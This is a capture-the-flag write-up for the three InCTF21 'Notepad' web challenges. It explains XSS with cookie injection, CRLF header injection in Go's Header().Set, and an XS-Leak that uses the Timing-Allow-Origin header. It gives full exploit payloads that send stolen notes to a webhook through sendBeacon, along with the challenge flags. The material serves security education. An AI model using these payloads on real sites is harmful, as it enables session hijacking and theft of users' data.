# Notepad Series - InCTF21

## Initial Analysis:

All three challenges almost had the same base code with slight changes leading to different vulnerabilities. The challenge is a notepad application, where a user can enter whatever data they want. Only one note can be stored at a time. The notes are mapped to the user using their cookie. All the notes are retrieved from `/get` endpoint. Other endpoints are `/add` which adds a new note and `/find`. The `/find` endpoint is interesting. It has several parameters like `condition`, `startsWith`, `endsWith` and `debug`. The `debug` parameter which when set, can add a header in the response if your note doesn't match your query. The

ie., consider the user's note to be `inctfi_123` and the request is `/find?startsWith=incth&debug&addnew=param`, the response would contain `addnew: param` as a header, but, if it is `/find?startsWith=inctf&debug&addnew=param`, the response contains no additional header. 

Note: The cookie is set to HTTPOnly for all the challenges and SameSite is Lax except for the last challenge. The `/find` api has the following headers set to it be default  

```go
"Content-Type":            "text/plain",
"x-content-type-options":  "nosniff",
"X-Frame-Options":         "DENY",
"Content-Security-Policy": "default-src 'none';",
```

# Notepad 1 - Snakehole's Secret  

**Number of Solves**: 21  
**Points**: 823  
**Source**: [https://github.com/Az3z3l/Notepad1-Snakeholes_Secret/](https://github.com/Az3z3l/Notepad1-Snakeholes_Secret/)  

### Challenge Description

Janet Snakehole, the rich aristocratic widow with a terrible secret, is being investigated by the FBI's number 1, Burt Tyrannosaurus Macklin. Burt found a website that she visits often. See if you can find anything.

### Solution

In this challenge the note of the user is inserted into the HTML document using `innerHTML` and no sanitization is done on the backend. So a user insert arbitrary HTML and get XSS. But this is just a self-XSS. To get XSS on the admin side, we can use the /find api to set a `Set-Cookie` header and use our own cookie on admin. The final payload is  
```html
<!-- Attacker's note -->
<img src/onerror="eval(window.name)"> 

<!-- Setting a cookie with your Cookie -->
<script>
    window.open(`http://chall.notepad1.gq:1111/find?startsWith=d&debug=y&Set-Cookie=id=${cookie}%3B%20path=/get`)
    // Set cookie to /get so it doesn't delete existing admin cookie
</script>

<!-- Exploiting it -->
<script>
    window.open("http://chall.notepad1.gq:1111",name=`document.cookie='id=${cookie}; expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/get;';document.cookie=x;fetch('/get').then(response=>response.text()).then(data=>navigator.sendBeacon('${webhook}',data));`)
    // Delete the cookie set by you and then retrieve admin's flag
</script>

```
**Flag:** `inctf{youll_never_take_me_alive_ialmvwoawpwe}`


# Notepad 1.5 - Arthur's Article

**Number of Solves**: 16  
**Points**: 900  
**Source**: [https://github.com/Az3z3l/Notepad1-Snakeholes_Secret/](https://github.com/Az3z3l/Notepad1-Snakeholes_Secret/)  

### Challenge Description

Arthur Morgan was asked to retrieve an important article from Cornwall's computer. Help him steal it.

### Solution

In this challenge, the XSS bug is removed and the Header setting part gets weird.

```go
for v, d := range param {
    for _, k := range d {

        if regexp.MustCompile("^[a-zA-Z0-9{}_;-]*$").MatchString(k) && len(d) < 5 {
            w.Header().Set(v, k)
        }
        break
    }
    break
}
```
In, Notepad 1, the `Header name` was compared with a regex, but in this challenge, only the value is compared with a regex. With a bit of testing, one can understand that `Header().Set()` is vulnerable to a CRLF bug in the name parameter. Final payload that can be used is

```html
<script>
    window.open("http://chall.notepad15.gq/find?startsWith=asd&debug=2&A:asd%0AContent-Type:text/html%0A%0A%3Chtml%3E%3Cscript%3Eeval(window.name)%3C/script%3E", name=`fetch('/get').then(response=>response.text()).then(data=>navigator.sendBeacon('${webhook}',data))`)
</script>
```
**Flag:** `inctf{red_dead_rezoday_ialmvwoawpwe}`

### Unintended for Notepad 1 and Notepad 2

Some of the unintended ways using Xsleaks are, `Refresh` header with a redirection back to a webhook and `Content-Disposition` header to download the page and check for navigation. 

# Notepad 2 - Ken's Chronicle

**Number of Solves**: 14  
**Points**: 925  
**Source**: [https://github.com/Az3z3l/Notepad2-Kens_Chronicle/](https://github.com/Az3z3l/Notepad2-Kens_Chronicle/)

### Challenge Description

"Years ago, when I was backpacking across Western Europe, I was just outside of Barcelona, hiking in the foothills of Mount Tibidabo. I was at the end of this path, and I came to a clearing, and there was a lake, very secluded, and there were tall trees all around. It was dead silent. Gorgeous. And across the lake, I saw a beautiful woman bathing herself. But she was crying...". There is a rumor that the rest of the story is on this website. Help Ken Adams uncover it.

### Solution

This challenge was based on [XSLeaks](https://xsleaks.dev/). The challenge uses a `Secure` cookie with SameSite as `None`. One other important difference in this challenge is the typo `"X-Frame-Options": "DENI",`. This allows the page to open in an Iframe. The Header setting part is shown below. 

```go
for k, v := range param {
    for _, d := range v {

        if regexp.MustCompile("^[a-zA-Z0-9{}_;-]*$").MatchString(k) && !regexp.MustCompile("[A-Za-z]{7}-[A-Za-z]{11}").MatchString(k) && len(d) < 4 && len(k) < 39 {
            w.Header().Set(k, d)
        }
        break
    }
    break
}
```

In this, we are allowed to set only a Header value of less than 4 characters. And it also disallows a Header name that matches `[A-Za-z]{7}-[A-Za-z]{11}`(Intent was to block Content-Disposition). The idea was to use `Timing-Allow-Origin: *` header. This header allows the host to use the performance api on the request used to fetch that resource. Without Timimg-Allow-Origin header, performance api doesn't give back the full result, but a minified version of it.   

The state I used in my POC was `nextHopProtocol`, which would be equal to "" if the header was not set. So, if our startsWith is correct, `nextHopProtocol` would be empty. 

Exploit:
```html
<html>
    <head>
        <title>Exploit - Ken's Chronicle</title>
    </head>

    <body>

    </body>
    <script>
        async function run() {
            startsWith = window.location.search.substring(1);


            characterSet = "abcdefghijklmno"
            characterSet += "pqrstuvwxyz_{}"


            for (var j = 0; j < characterSet.length; j++){
                bf = startsWith + characterSet[j]
                url = `https://7649ac48b82b.ngrok.io/find?startsWith=${bf}&debug&Timing-Allow-Origin=*`
                
                var iframe = document.createElement('iframe');
                iframe.src = url;
                iframe.onload = "alert()"
                document.body.appendChild(iframe);

            }
        }
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function checker(){
            list = window.performance.getEntriesByType("resource");
            console.log(list)
            for (i=0; i<list.length; i++){
                curr = list[i]
                if (curr.nextHopProtocol == ""){
                    try {
                        navigator.sendBeacon(`?flag=${curr.name.split("startsWith=")[1].split("&")[0]}`)
                    } catch (error) {
                        console.log(error)
                    }
                }
            }
        }

        async function doit() {
            run()
            await sleep(10000);
            checker()
        }
        doit()
    </script>


</html>
```

One other way to do this is use `Refresh` header and counting the onload events. Since this challenge uses a SameSite: None, has no Iframe protections, aaand the number of headers we can use are vast, there are quite a number of ways to solve this. 

**Flag:** `inctf{tis_a_mooo_point_lkbsdgbyhsl}`